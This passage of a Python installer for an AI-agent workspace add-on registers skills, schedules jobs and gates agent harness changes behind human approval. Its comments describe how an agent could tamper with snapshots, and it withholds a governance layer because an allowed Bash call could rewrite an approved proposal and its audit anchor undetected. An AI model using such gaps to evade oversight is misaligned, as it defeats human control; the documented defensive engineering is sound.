        return die(f"this clone is incomplete (missing: {', '.join(missing)}) — "
                   f"re-clone rather than installing from a partial tree.")
    target.mkdir(parents=True, exist_ok=True)

    # Wave 2H: the receipt + pre-write baseline are step one, before any
    # component lands — a same-uid agent can't rewrite a snapshot taken
    # after the fact, because there isn't one; this IS the snapshot.
    try:
        receipt = _init_receipt(target, "into" if into else "fresh")
    except FileExistsError:
        return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} already exists — a previous install "
                   f"attempt left state here. Remove {target}/{CC_SEED_DIR}/ (after confirming "
                   f"nothing else was partially written) before retrying, or pick a fresh target.")
    receipt["install"]["skipped"] = skipped
    _capture_baseline(target, receipt)

    written = [c for c in COMPONENTS if c not in skipped]
    for comp in written:
        shutil.copytree(HERE / comp, target / comp)
    for f in ROOT_FILES:
        shutil.copy2(HERE / f, target / f)
    registered_skills, deferred_skills, refused_skills = (
        _register_skills(target) if "skills" in written else ([], [], []))
    default_jobs = _install_default_jobs(target) if "scheduler" in written else []
    receipt["install"]["components"] = written
    receipt["install"]["registered_skills"] = registered_skills
    # Merge BEFORE the _save_receipt below, not from inside _register_skills —
    # that save is the one that used to clobber the deferrals.
    _merge_deferred(receipt, deferred_skills)
    _merge_refused(receipt, refused_skills)
    receipt["install"]["default_jobs"] = default_jobs
    # SEED-076: snapshot exactly what THIS install wrote, scoped to `written`
    # (never a skipped-as-satisfied-by-existing component) — so --update has
    # real per-file history from day one and never needs the historical-
    # commit-fetch legacy-bootstrap fallback for anything installed from here on.
    receipt["shipped"] = _shipped_snapshot(target, written + ROOT_FILES)
    # R2: the bytes that landed, measured, so the contract can prove the tree
    # it ran inside is still the tree this install wrote.
    _record_installed_sha(target, receipt)
    _save_receipt(target, receipt)

    mode = "composed into your existing workspace at" if into else "->"
    print(f"installed {len(written)} components + {len(ROOT_FILES)} files {mode} {target}")
    if registered_skills:
        print(f"registered {len(registered_skills)} skill(s) at {target}/.claude/skills/ "
              f"({', '.join(registered_skills)}) — discoverable immediately from any "
              f"session whose working directory is under {target}")
    if default_jobs:
        print(f"scheduled by default: {', '.join(default_jobs)} (not yet synced to the "
              f"real scheduler — run {target}/scheduler/sync.sh, or use --enable-demo "
              f"first if you also want hello_fleet)")
    print(f"install receipt: {target}/{CC_SEED_DIR}/{RECEIPT_NAME}")
    print("next: run the Phase 3 verify commands from AGENT-INSTALL.md")
    return 0


# --- SEED-080: registration is decided by ORIGIN, not by name ---------------
# A recipient who already runs these skills at USER scope (~/.claude/skills)
# is the normal case on a fleet host, and registering a second project-scoped
# copy of the same file is how two doors appear. Name alone cannot tell "the
# same skill, already installed" from "a different skill that happens to
# share a name", and a --defer flag cannot either: a flag has to be remembered
# on every host, and that remembering is exactly what failed here in the week
# this was written. So the question the installer asks is about ORIGIN: is the
# file at user scope the same body as the one we ship?
#
# Same body  -> DEFER. Record it; register nothing; the user-scope copy wins.
# Different  -> REFUSE, loudly, naming BOTH paths. Never overwrite, never
#               silently shadow: the operator decides which one is theirs.
# Absent     -> register, exactly as before.
#
# The hash is computed at install time from both files. Nothing is injected
# into the shipped SKILL.md to carry it: a fleet copy has no such field to
# read, so every fleet --update would hit the refuse branch, and injecting one
# would break the byte-identical property that makes the seed copy and the
# fleet copy one file rather than two.
def _body_sha(path: Path) -> str:
    """Identity of a skill's text, insensitive to trailing-newline churn."""
    try:
        return _sha256_bytes(path.read_bytes().replace(b"\r\n", b"\n").rstrip() + b"\n")
    except OSError:
        return ""


def _user_scope_skill(name: str) -> Path:
    return Path.home() / ".claude" / "skills" / name / "SKILL.md"


def _origin_verdict(name: str, canonical: Path):
    """Return (verdict, user_path, sha) — 'register' | 'defer' | 'refuse'."""
    user = _user_scope_skill(name)
    if not user.exists():
        return "register", user, ""
    ours, theirs = _body_sha(canonical), _body_sha(user)
    if ours and ours == theirs:
        return "defer", user, ours
    return "refuse", user, theirs


def _apply_origin_rule(name: str, canonical: Path, deferred: list,
                       refused: list = None) -> bool:
    """True if the caller should go on to register this skill."""
    verdict, user, sha = _origin_verdict(name, canonical)
    if verdict == "register":
        return True
    if verdict == "defer":
        deferred.append({"name": name, "user_path": str(user), "body_sha": sha,
                         "at": _now()})
        print(f"skill {name!r}: already installed at user scope with the SAME body "
              f"({user}) — deferring to it, registering nothing here.")
        return False
    # A refusal used to leave NO trace anywhere: no link, no deferral, no
    # receipt field. The install exited 0, --audit check 1 said PASS, and the
    # operator had an install with a silently missing skill and nothing that
    # would ever mention it again (2026-09-19 review, finding 5, executed as
    # refusal_not_recorded). A decision the system made is state the system
    # owns.
    if refused is not None:
        refused.append({"name": name, "user_scope_path": str(user),
                        "user_sha": sha, "seed_sha": _body_sha(canonical),
                        "at": _now()})
    print(f"skill {name!r}: REFUSING to register — a DIFFERENT skill of this name "
          f"is installed at user scope.\n"
          f"  user scope: {user}\n"
          f"  this seed:  {canonical}\n"
          f"  Neither is overwritten and neither is shadowed. Compare them and "
          f"keep the one you mean; re-run once they agree or one is renamed.",
          file=sys.stderr)
    return False


def _iter_skill_dirs(skills_root: Path):
    """Yield (name, canonical SKILL.md path) for each real skill under a
    skills/ tree — a directory containing SKILL.md, not a shared doc like
    skills/LAYERS.md sitting at the top level."""
    if not skills_root.is_dir():
        return
    for entry in sorted(skills_root.iterdir()):
        canonical = entry / "SKILL.md"
        if entry.is_dir() and canonical.is_file():
            yield entry.name, canonical


def _shipped_skill_names() -> list:
    """Skill names this clone would install, read from the SOURCE tree
    (HERE / "skills") — used for the pre-write --into collision check, since
    at that point target/skills/ doesn't exist yet to enumerate instead."""
    return [name for name, _ in _iter_skill_dirs(HERE / "skills")]


def _merge_deferred(receipt: dict, deferred: list):
    """Merge deferrals INTO the caller's in-memory receipt. A deferral is a
    live dependency on a file OUTSIDE this install: if the user-scope twin is
    edited later, this install is quietly running a skill it never saw, and
    _verify_deferred_skills re-checks exactly these records at audit time.

    In-memory, and returning nothing, ON PURPOSE. Until 2026-09-18 this
    function loaded the receipt from disk, merged, and saved — while BOTH its
    callers sat between an earlier `_init_receipt`/`_load_receipt` and a later
    `_save_receipt(target, receipt)` of their own. That final save wrote a dict
    that had never seen the deferrals and silently erased them: a textbook lost
    update, on every fresh install and every --update. The deferral was decided
    and printed correctly, so the only visible symptom was that
    _verify_deferred_skills had ZERO subjects and could never fire — a watchdog
    watching nothing. Caught by CI run 35406434862 (`assert 'improve' in d` ->
    AssertionError: []) on the first publish that ever ran the step.

    Keeping this pure means a future caller cannot reintroduce the race: there
    is no second writer to lose to."""
    if not deferred:
        return
    existing = {d["name"]: d for d in receipt["install"].get("deferred_skills", [])}
    for d in deferred:
        existing[d["name"]] = d
    receipt["install"]["deferred_skills"] = [existing[k] for k in sorted(existing)]


def _merge_refused(receipt: dict, refused: list, seen: list = None):
    """Merge refusals INTO the caller's in-memory receipt — same seam, and the
    same purity rule, as _merge_deferred (see its docstring for why this must
    not load-and-save on its own).

    `seen` is the set of skill names this pass actually re-decided; a name in
    it that is NOT in `refused` has been resolved, and its record is dropped.
    Accretion needs a removal path (PRINCIPLES 23), or the receipt just gets
    less true while looking the same size."""
    existing = {d["name"]: d for d in receipt["install"].get("refused_skills", [])}
    for name in (seen or []):
        existing.pop(name, None)
    for d in refused or []:
        existing[d["name"]] = d
    if existing or "refused_skills" in receipt["install"]:
        receipt["install"]["refused_skills"] = [existing[k] for k in sorted(existing)]


def _verify_refused_skills(target: Path, receipt: dict) -> list:
    """A refused skill is a live, unresolved collision. It is FLAGGED on every
    audit until it is resolved — never silence."""
    problems = []
    for d in receipt.get("install", {}).get("refused_skills", []) or []:
        name = d["name"]
        user = d.get("user_scope_path", "?")
        problems.append(
            f"skills/{name}: REFUSED at install — a different skill of this "
            f"name is at {user}, so nothing is registered here and this "
            f"install has no {name} skill. Resolve the collision (rename or "
            f"reconcile the two) and re-run install.py --update --apply.")
    return problems


def _verify_deferred_skills(target: Path, receipt: dict) -> list:
    """Re-run the origin question at audit time, against the file as it is
    NOW. Recorded-and-forgotten is the failure mode: the twin was the same
    body once, which says nothing about today."""
    problems = []
    for d in receipt.get("install", {}).get("deferred_skills", []) or []:
        name, user = d["name"], Path(d["user_path"])
        canonical = target / "skills" / name / "SKILL.md"
        if not user.exists():
            problems.append(f"skills/{name}: deferred to {user}, which is GONE — this "
                            f"install now has no {name} skill registered at all")
            continue
        if not canonical.exists():
            problems.append(f"skills/{name}: deferred, but this install no longer ships it")
            continue
        now = _body_sha(user)
        if now != d.get("body_sha"):
            problems.append(f"skills/{name}: the user-scope twin at {user} has CHANGED "
                            f"since the deferral ({d.get('body_sha','')[:12]} -> {now[:12]}) "
                            f"— re-read it, or re-run the install to re-decide")
        elif now != _body_sha(canonical):
            problems.append(f"skills/{name}: the SHIPPED copy has changed since the "
                            f"deferral — the user-scope twin is now a different skill")
    return problems


def _register_new_skills(target: Path) -> tuple:
    """SEED-076's --update calls this, never _register_skills(): that
    function's own docstring says its assertion is a fresh-install-only
    backstop that "must never be the first place a collision is
    discovered" — true for install(), false for --update, which by design
    RE-RUNS against a target that already has every previously-shipped
    skill registered. Calling _register_skills() there crashed on the
    first live test of this feature (every already-registered skill
    tripped the "should be impossible" assert). This is the idempotent
    twin: skip a skill that's already correctly linked, register one
    that's missing entirely, and treat anything else (a real file sitting
    where the symlink should be, or a symlink pointing somewhere else) as
    a conflict to report rather than something to crash or silently
    overwrite. Returns the list of NEWLY registered skill names."""
    claude_skills = target / ".claude" / "skills"
    registered, conflicts = [], []
    deferred, refused, seen = [], [], []
    for name, canonical in _iter_skill_dirs(target / "skills"):
        link_dir = claude_skills / name
        link = link_dir / "SKILL.md"
        want_target = os.path.relpath(canonical, link_dir)
        if link.is_symlink() and os.readlink(link) == want_target:
            continue  # already correctly registered — the origin rule is for NEW links
        seen.append(name)
        if not _apply_origin_rule(name, canonical, deferred, refused):
            continue
        if link.is_symlink() and os.readlink(link) == want_target:
            continue  # already correctly registered — nothing to do
        if link.exists() or link.is_symlink():
            conflicts.append(name)
            continue
        link_dir.mkdir(parents=True, exist_ok=True)
        link.symlink_to(want_target)
        registered.append(name)
    if conflicts:
        print(f"update: {len(conflicts)} skill link(s) exist but don't point where expected — "
             f"left alone, review by hand: {', '.join(conflicts)}", file=sys.stderr)
    return registered, deferred, refused, seen


def _register_skills(target: Path) -> tuple:
    """SEED-071: shipping skills/<name>/SKILL.md is not enough — Claude Code
    only discovers skills at ~/.claude/skills/ (user-level) or .claude/skills/
    (project-level, searched upward from the working directory). Nothing
    wrote either, so a fresh install's skills were invisible until an
    operator registered them by hand. Project-level is the right home here:
    it works the moment an agent's cwd is anywhere under --target, needs no
    write to the recipient's global ~/.claude/, and composes cleanly with
    --into (a recipient's own global skills are untouched).

    Symlinks (not copies) so the canonical file — the one skill-center's
    audit.py lints and scaffold.py's plan describes — stays the single
    source of truth; relative targets so the whole tree can be moved without
    breaking the link. Collisions are refused before this runs (install()'s
    --into pre-check, alongside COMPONENTS/ROOT_FILES) — the assertion below
    is a belt-and-suspenders backstop, not the primary guard: it must never
    be the first place a collision is discovered, since skills/ and every
    other component are already on disk by the time this function runs.
    Returns the list of registered skill names."""
    claude_skills = target / ".claude" / "skills"
    registered = []
    deferred, refused = [], []
    for name, canonical in _iter_skill_dirs(target / "skills"):
        link_dir = claude_skills / name
        link = link_dir / "SKILL.md"
        if not _apply_origin_rule(name, canonical, deferred, refused):
            continue
        assert not (link.exists() or link.is_symlink()), (
            f"{link} already exists — install()'s pre-write collision check "
            f"should have refused this install before skills/ was written")
        link_dir.mkdir(parents=True, exist_ok=True)
        link.symlink_to(os.path.relpath(canonical, link_dir))
        registered.append(name)
    return registered, deferred, refused


def enable_demo(target: Path):
    manifest = target / "scheduler" / "manifest.yml"
    if not manifest.exists():
        return die(f"{manifest} not found — is {target} an AI-OS Seed install?")
    if not _add_job(manifest, "hello_fleet", JOB_HELLO_FLEET.format(root=target)):
        print("hello_fleet already in the scheduler manifest — nothing to do.")
        return 0
    print(f"hello_fleet (every 15 min) written to {manifest}")
    print(f"next: bash {target}/scheduler/sync.sh")
    return 0


def _install_default_jobs(target: Path) -> list:
    """SEED-070/074: unlike hello_fleet (opt-in via --enable-demo), these are
    written into a fresh install's manifest unconditionally — see each job
    constant's own comment for why it's safe to default on. Returns the list
    of job names installed this call (a name is omitted if it was already
    present, e.g. a repeat run somehow reached this point)."""
    manifest = target / "scheduler" / "manifest.yml"
    installed = []
    jobs = [("repo_hygiene", JOB_REPO_HYGIENE), ("freshness", JOB_FRESHNESS)]
    if (target / "memory-mesh" / "fold_watch.py").exists():
        jobs.append(("mesh_watch", JOB_MESH_WATCH))
    for name, block in jobs:
        if _add_job(manifest, name, block.format(root=target)):
            installed.append(name)
    return installed


def enable_governance(target: Path):
    """Copy the governance/ tree into an existing install — opt-in only,
    never part of the default COMPONENTS copy (SEED-065). Idempotent:
    refuses if governance/ already exists there rather than silently
    overwriting a possibly-customized policy.yml."""
    if not (target / "PRINCIPLES.md").exists():
        return die(f"{target} doesn't look like an AI-OS Seed install — is --target correct?")
    dest = target / "governance"
    if dest.exists():
        print(f"{dest} already exists — nothing to do (if you want to reset it, "
              f"remove it yourself first; policy.yml may be customized).")
        return 0
    src = HERE / "governance"
    if not src.exists():
        # WITHHELD 2026-07-31, not missing. Distinguish the two: the old message
        # here told the user their clone was incomplete and to re-clone, which
        # would send them round a loop that can never succeed against a build
        # that deliberately doesn't carry this tree.
        return die("governance/ is withheld in this release — your clone is fine.\n"
                    "The informed-approval control was unsound (an allowed Bash call "
                    "could rewrite a staged proposal and its audit anchor while the "
                    "verifier still reported it unchanged), so the layer is held back "
                    "rather than shipped reading stronger than it is.\n"
                    "Principle 17 in PRINCIPLES.md still stands — the doctrine was "
                    "right, the enforcement was not.")
    shutil.copytree(src, dest)
    print(f"governance/ copied to {dest}")
    print("next: run the governance phase's validate/compile/consent/conformance steps "
          "from AGENT-INSTALL.md before treating this install as governed.")
    return 0


def _memory_is_pristine(p: Path) -> bool:
    """True only if memory/ is byte-identical to the shipped scaffold — same
    file names, same contents, no subdirectories. Anything else means the
    user (or their agent) has made it theirs."""
    shipped = HERE / "memory"
    if not shipped.is_dir():
        return False  # can't prove pristine -> keep (degrade toward safety)
    ours = sorted(f.name for f in shipped.iterdir() if f.is_file())
    theirs = sorted(f.name for f in p.iterdir())
    if ours != theirs:
        return False
    return all(filecmp.cmp(shipped / n, p / n, shallow=False) for n in ours)


def _tree_is_pristine(shipped: Path, installed: Path) -> bool:
    """Recursive byte-identical check (governance/'s policy.yml is very
    plausibly org-customized after a real governance install — same
    keep-if-touched caution as memory/, generalized)."""
    if not shipped.is_dir() or not installed.is_dir():
        return False
    cmp = filecmp.dircmp(shipped, installed)
    if cmp.left_only or cmp.right_only or cmp.diff_files or cmp.funny_files:
        return False
    return all(_tree_is_pristine(shipped / d, installed / d) for d in cmp.common_dirs)


def uninstall(target: Path):
    sync = target / "scheduler" / "sync.py"
    manifest = target / "scheduler" / "manifest.yml"
    if not (sync.exists() and manifest.exists() and (target / "PRINCIPLES.md").exists()):
        return die(f"{target} doesn't look like an AI-OS Seed install — refusing "
                   f"to delete it. Remove it yourself if you're sure.")
    # SEED-071: undo exactly the symlinks _register_skills() created, before
    # skills/ itself is removed below — otherwise .claude/skills/<name>/
    # is left holding a dangling symlink into a now-deleted directory.
    # Read from the receipt (what THIS installer actually registered), never
    # blind-globbed off .claude/skills/, since that directory may also hold
    # skills the recipient registered themselves, before or after installing.
    receipt = _load_receipt(target)
    registered = (receipt or {}).get("install", {}).get("registered_skills", [])
    for name in registered:
        link_dir = target / ".claude" / "skills" / name
        link = link_dir / "SKILL.md"
        if link.is_symlink():
            link.unlink()
            if not any(link_dir.iterdir()):
                link_dir.rmdir()
    claude_skills = target / ".claude" / "skills"
    if claude_skills.is_dir() and not any(claude_skills.iterdir()):
        claude_skills.rmdir()
        claude_dir = target / ".claude"
        if claude_dir.is_dir() and not any(claude_dir.iterdir()):
            claude_dir.rmdir()
    # De-schedule first: empty the manifest, let sync reconcile (removes the
    # managed crontab block / launchd plists), then remove the seed's files.
    manifest.write_text("jobs: []\n")
    r = subprocess.run([sys.executable, str(sync)], capture_output=True, text=True)
    if r.returncode != 0:
        print(f"warning: scheduler cleanup reported: {r.stderr.strip() or r.stdout.strip()}",
              file=sys.stderr)
        print("continuing with file removal; check `crontab -l` / launchctl yourself.",
              file=sys.stderr)
    else:
        print("scheduled jobs removed.")
    # Remove ONLY the seed's own names, never the tree wholesale — a --into
    # install shares its root with the user's workspace, and even a dedicated
    # root may have grown user content (NOW.md, memory notes, their CLAUDE.md).
    for name in COMPONENTS + OPTIONAL_COMPONENTS + ROOT_FILES:
        p = target / name
        if not p.exists() and name in OPTIONAL_COMPONENTS:
            continue  # never enabled — nothing to remove, nothing to warn about
        if name == "memory" and p.is_dir() and not _memory_is_pristine(p):
            # memory/ is the user's brain and notes are irreplaceable: it is
            # only deleted when byte-identical to the shipped scaffold (a
            # provably untouched install). Any note, edit, or a pre-existing
            # workspace memory (a composed install never wrote here at all)
            # makes it theirs — kept, unconditionally. Cheap to delete by
            # hand; impossible to undo.
            print(f"kept {p} — it differs from the shipped scaffold, so it's "
                  f"yours, not the seed's; delete it yourself if you're sure.")
            continue
        if name == "governance" and p.is_dir() and not _tree_is_pristine(HERE / "governance", p):
            # Same caution as memory/: a real governance install very likely
            # customized policy.yml (org name, overlays) — kept unless
            # provably untouched.
            print(f"kept {p} — it differs from the shipped scaffold (likely a "
                  f"customized policy.yml), so it's yours; delete it yourself if you're sure.")
            continue
        if p.is_dir():
            shutil.rmtree(p)
        elif p.exists():
            p.unlink()
    # The receipt/staged scaffold is install.py's own bookkeeping, not the
    # user's — always drop it on uninstall.
    cc_seed_dir = target / CC_SEED_DIR
    if cc_seed_dir.is_dir():
        receipt_file = cc_seed_dir / RECEIPT_NAME
        if receipt_file.exists():
            receipt_file.unlink()
        staged = cc_seed_dir / STAGED_DIR
        if staged.is_dir():
            shutil.rmtree(staged)
        if cc_seed_dir.is_dir() and not any(cc_seed_dir.iterdir()):
            cc_seed_dir.rmdir()
    # Its out-of-target mirror (F1 fix) is the same bookkeeping, just
    # anchored elsewhere — drop it too rather than accumulating stale
    # anchors forever across install/uninstall cycles.
    anchor = _anchor_path(target)
    if anchor.exists():
        anchor.unlink()
    leftover = sorted(p.name for p in target.iterdir())
    if leftover:
        print(f"removed the seed's components from {target}.")
        print(f"left untouched (yours, not the seed's): {', '.join(leftover[:10])}"
              + (" …" if len(leftover) > 10 else ""))
    else:
        target.rmdir()
        print(f"removed {target}. That's the whole footprint — nothing else was installed.")
    return 0


# --- Wave 2H, piece 2: --approve (SEED-069) ---------------------------------
# install.py, not the agent, performs the two highest-stakes writes. The
# agent's role stops at staging (claude-md) or showing the fixed command
# (mesh-bootstrap); a human runs --approve, which hashes what it's about to
# apply, records that hash in the receipt under a key the agent's own write
# path can't set, and only then moves the bytes — in the same step, so there
# is no window between "recorded as approved" and "written" for an agent to
# race.

def approve(target: Path, which: str, from_pack: str = None, replace: bool = False, tag: str = None,
            allowed_signers: str = None, allow_unsigned: bool = False):
    receipt = _load_receipt(target)
    if receipt is None:
        return die(f"{target}/{CC_SEED_DIR}/{RECEIPT_NAME} not found — was this target "
                   f"installed with this install.py?")
    if which == "claude-md":
        return _approve_claude_md(target, receipt)
    if which == "memory-hooks":
        return _approve_memory_hooks(target, receipt)
    if which == "import-pack":
        return _approve_import_pack(target, receipt, from_pack, replace, tag,
                                     allowed_signers, allow_unsigned)
    return _approve_mesh_bootstrap(target, receipt)


def _approve_claude_md(target: Path, receipt: dict) -> int:
    staged = target / CC_SEED_DIR / STAGED_DIR / "claude-md.proposed"
    if not staged.exists():
        return die(f"{staged} not found — the agent must stage the proposed CLAUDE.md "
                   f"addition there before you run --approve (AGENT-INSTALL.md Phase 4).")
    claude_md = target / "CLAUDE.md"
    existing = claude_md.read_bytes() if claude_md.exists() else b""
    if MARKER_START.encode() in existing or MARKER_END.encode() in existing:
        return die(f"{claude_md} already has a cc-seed region — refusing to nest or overwrite "
                   f"a prior seed block. A second install into the same root is a distinct "
                   f"install; resolve the collision by hand.")
    proposed = staged.read_bytes().replace(b"\r\n", b"\n")
    if not proposed.endswith(b"\n"):
        proposed += b"\n"
    proposed_hash = _sha256_bytes(proposed)
    region = MARKER_START.encode() + b"\n" + proposed + MARKER_END.encode() + b"\n"
    before = (existing + b"\n\n") if existing else b""
    new_bytes = before + region

    _atomic_write(claude_md, new_bytes)

    receipt.setdefault("gated_writes", {})["claude-md"] = {
        "approved_hash": proposed_hash, "approved_at": _now(), "written": True,
    }
    _save_receipt(target, receipt)
    try:
        staged.rename(staged.with_suffix(".approved"))
    except OSError:
        pass  # non-fatal — the receipt is the record of truth, not the staged file
    print(f"CLAUDE.md region approved and written — hash {proposed_hash}")
    print(f"recorded in {target}/{CC_SEED_DIR}/{RECEIPT_NAME}")
    return 0


def _mesh_store_dir(target: Path):
    """The workspace's actual Claude Code auto-memory store —
    ~/.claude/projects/<slug of target>/memory/, derived by mesh_lib's own
    store_dir(), NOT <ROOT>/memory/. install.sh's Phase 5 step 3 mutates
    THIS path (MEMORY.md flip to GENERATED, MEMORY.md.pre-mesh backup);
    <ROOT>/memory/ is the shipped scaffold/doc copy and is never touched by
    the bootstrap. Discovered live while testing this wave — the v2 spec
    assumed <ROOT>/memory/ was the mutation target; it isn't. Imported from
    the target's own shipped mesh_lib.py rather than re-derived here, so the
    formula can never drift from the one install.sh actually uses."""
    code = target / "memory-mesh"
    if not (code / "mesh_lib.py").exists():
        return None
    r = subprocess.run(
        [sys.executable, "-c",
         "import sys; sys.path.insert(0, sys.argv[1]); import mesh_lib; print(mesh_lib.store_dir())",
         str(code)],
        capture_output=True, text=True)
    if r.returncode != 0 or not r.stdout.strip():
        return None
    return Path(r.stdout.strip())


def _approve_mesh_bootstrap(target: Path, receipt: dict) -> int:
    script = target / "memory-mesh" / "install.sh"
    if not script.exists():
        return die(f"{script} not found — is {target} an AI-OS Seed install with memory-mesh?")
    store = _mesh_store_dir(target)
    pre_memory_md = (store / "MEMORY.md") if store else None
    pre_hash = _sha256_file(pre_memory_md) if pre_memory_md and pre_memory_md.exists() else None
    print(f"running: bash {script}")
    r = subprocess.run(["bash", str(script)])
    if r.returncode != 0:
        # Recorded as a FAILED attempt, not left absent: an operator who reruns
        # --audit should see that bootstrap was tried and did not complete,
        # rather than an install that looks like it was never bootstrapped.
        receipt.setdefault("gated_writes", {})["mesh-bootstrap"] = {
            "approved_at": _now(), "written": False,
            "error": f"memory-mesh/install.sh exited {r.returncode}",
        }
        _save_receipt(target, receipt)
        return die(f"memory-mesh/install.sh exited {r.returncode} — not recorded "
                   f"as approved (the failing step is named above).")
    store = _mesh_store_dir(target)  # re-derive: install.sh itself may be what created mesh_lib's importability
    post_memory_md = (store / "MEMORY.md") if store else None
    post_hash = _sha256_file(post_memory_md) if post_memory_md and post_memory_md.exists() else None
    receipt.setdefault("gated_writes", {})["mesh-bootstrap"] = {
        "approved_at": _now(), "written": True,
        "store_dir": str(store) if store else None,
        "pre_memory_md_hash": pre_hash, "post_memory_md_hash": post_hash,
    }
    _save_receipt(target, receipt)
    print("mesh-bootstrap approved and applied; recorded in the receipt.")
    if store:
        print(f"memory store: {store}")
    return 0


# --- SEED-080: --approve memory-hooks ---------------------------------------
# The mesh ships five hooks and, until this verb, wired none of them: the
# retrieval channel sat inert and the one-door rule was prose. Wiring a hook
# is self-modification of the agent's own harness, so it is a gated write with
# a human at the gate — shown as an exact settings.json diff, applied in the
# same step that records it, and REVOCABLE: --revoke memory-hooks removes
# exactly the entries this recorded, restoring the prior bytes. An approval
# with no undo is a trap, not a gate.
MEMORY_HOOKS = [
    # (event, matcher or None, command tail relative to the install root)
    ("UserPromptSubmit", None, "memory-mesh/retrieve.py"),
    ("PostToolUse", "Read|Grep|Glob|Bash", "memory-mesh/retrieve.py"),
    ("PreToolUse", "Write|Edit|MultiEdit|NotebookEdit|Bash",
     "memory-mesh/hooks/memory-write-guard.py"),
    ("PreToolUse", "Bash|Write|Edit", "memory-mesh/hooks/memory-fresh.py"),
    ("SessionStart", None, "memory-mesh/hooks/session_provenance.py record --event SessionStart"),
    ("PreToolUse", "WebFetch|WebSearch|Bash|mcp__.*",
     "memory-mesh/hooks/session_provenance.py record --event PreToolUse"),
    ("Stop", None, "memory-mesh/capture_nudge.py"),
]


def _memory_hook_entries(target: Path) -> dict:
    """The settings.json fragment this verb writes, with absolute paths into
    THIS install — a relative hook command resolves against the agent's cwd,
    which is not a promise any harness makes."""
    out = {}
    for event, matcher, tail in MEMORY_HOOKS:
        parts = tail.split(" ", 1)
        # Quoted: a legal --target containing a space installed and approved
        # cleanly, then bash split the hook command and python could not open
        # the script (2026-09-19 review, finding 13, executed as
        # hook_path_spaces: exit 2 naming the truncated path).
        cmd = f"{shlex.quote(sys.executable)} {shlex.quote(str(target / parts[0]))}"
        if len(parts) > 1:
            cmd += " " + parts[1]
        entry = {"hooks": [{"type": "command", "command": cmd}]}
        if matcher:
            entry["matcher"] = matcher
        out.setdefault(event, []).append(entry)
    return out


def _settings_path(target: Path) -> Path:
    return target / ".claude" / "settings.json"


def _approve_memory_hooks(target: Path, receipt: dict) -> int:
    mesh = target / "memory-mesh"
    missing = [t.split(" ")[0] for _, _, t in MEMORY_HOOKS
               if not (target / t.split(" ")[0]).exists()]
    if not mesh.is_dir() or missing:
        return die(f"memory-mesh hook files are missing from {target}: "
                   f"{', '.join(sorted(set(missing))) or mesh} — run the install "
                   f"(and --approve mesh-bootstrap) before wiring hooks.")
    settings = _settings_path(target)
    before = settings.read_bytes() if settings.exists() else b""
    try:
        doc = json.loads(before) if before.strip() else {}
    except ValueError as e:
        return die(f"{settings} is not valid JSON ({e}) — refusing to touch it.")
    adding = _memory_hook_entries(target)
    hooks = doc.setdefault("hooks", {})
    # Dedup on (event, matcher, command), not on "this string appears anywhere
    # in the hooks blob". A pre-existing UserPromptSubmit entry for retrieve.py
    # used to suppress the PostToolUse entry for the SAME script — which was
    # then still recorded in the receipt as approved, so the audit and the
    # watcher looked for something that had never been written (2026-09-19
    # review, finding 4, executed as existing_command_skips_other_event).
    present = _wired_hook_keys(doc)
    added, already_present = {}, {}
    for event, entries in adding.items():
        bucket = hooks.setdefault(event, [])
        for entry in entries:
            cmd = entry["hooks"][0]["command"]
            # (event, matcher, command) — the comment above has said this since
            # round 1; the code keyed on (event, command) until round 2 (R4).
            if (entry.get("matcher") or "", cmd) in present.get(event, ()):
                already_present.setdefault(event, []).append(cmd)
                continue
            bucket.append(entry)
            added.setdefault(event, []).append(cmd)
    for event in [e for e, v in hooks.items() if not v]:
        del hooks[event]
    after = (json.dumps(doc, indent=2) + "\n").encode()
    if after == before:
        # Nothing new to write — but if there is no record at all, revoke and
        # the audit have no subject, and `--revoke memory-hooks` then dies with
        # "was never approved on this install" on an install whose hooks ARE
        # wired (Grok, 2026-09-19). Record the adoption with an empty `entries`.
        if not (receipt.get("gated_writes") or {}).get("memory-hooks"):
            receipt.setdefault("gated_writes", {})["memory-hooks"] = {
                "approved_at": _now(), "written": True, "adopted": True,
                "entries": {}, "already_present": already_present,
                "prior_sha": _sha256_bytes(before), "prior_bytes_len": len(before),
                "after_sha": _sha256_bytes(after),
            }
            _save_receipt(target, receipt)
            print("memory hooks already wired — adopting them in the receipt so "
                  "--revoke and --audit have a subject (no entries are owned by "
                  "this install).")
            return 0
        print("memory hooks already wired — nothing to do.")
        return 0
    print(f"--- {settings} (before)\n+++ {settings} (after)")
    for line in difflib.unified_diff(
            before.decode("utf-8", "replace").splitlines(),
            after.decode().splitlines(), lineterm="", n=2):
        print(line)
    print(f"\n{len([e for v in adding.values() for e in v])} hook entr(ies): retrieval "
          f"on every turn, the write guard, the staleness guard, session provenance "
          f"and the capture nudge.")
    if not _confirm_hook_write():
        print("not written.")
        return 1
    settings.parent.mkdir(parents=True, exist_ok=True)
    _atomic_write(settings, after)
    receipt.setdefault("gated_writes", {})["memory-hooks"] = {
        "approved_at": _now(), "written": True,
        # ONLY what this install actually added. It used to record every
        # INTENDED command, including ones the dedup skipped, which made the
        # receipt a statement of intent rather than of fact — and revoke then
        # deleted entries it had never written.
        "entries": added, "already_present": already_present,
        # The IDENTITY of the prior file, never its CONTENT. Until 2026-09-19
        # this recorded `prior_bytes` -- the user's whole prior
        # settings.json, which routinely holds env.ANTHROPIC_API_KEY -- and
        # _save_anchor then copied the entire receipt to
        # ~/.cache/cc-seed/receipt-anchors/, OUTSIDE the target, where no
        # uninstall removes it and no audit looks. Nothing ever read the
        # bytes: revoke removes the recorded entries structurally.
        "prior_sha": _sha256_bytes(before), "prior_bytes_len": len(before),
        "after_sha": _sha256_bytes(after),
    }
    _save_receipt(target, receipt)
    print(f"memory hooks approved and written to {settings}; recorded in the receipt.")
    print("M1 (one door, enforced) and M4 (memory reaches the session) do not hold "
          "without these — check with: install.py --target ... --contract")
    return 0


def _confirm_hook_write() -> bool:
    """CI applies the SAME staged diff non-interactively through the existing
    --approve/--apply shape; it never gets a new --yes flag, because a flag
    that means "skip the human" is one typo away from being passed by a human.

    `--apply` means "I have seen the staged diff and affirm it", so it reads
    the same on the way OUT as on the way in — --revoke stages a diff and
    calls this gate exactly as --approve does. Until 2026-09-18 the arg gate
    refused --apply alongside --revoke, which made a non-interactive revoke
    unreachable by BOTH paths: with --apply the gate died at argv parsing,
    and without it this function fell through to input() and took the
    EOFError branch. Caught by the first CI run that ever exercised it
    (0.4.0-alpha, run 35404705676); the live check passed because a human
    typed y."""
    if os.environ.get("CI") == "true" and "--apply" in sys.argv:
        print("CI=true with --apply — applying the staged diff non-interactively.")
        return True
    try:
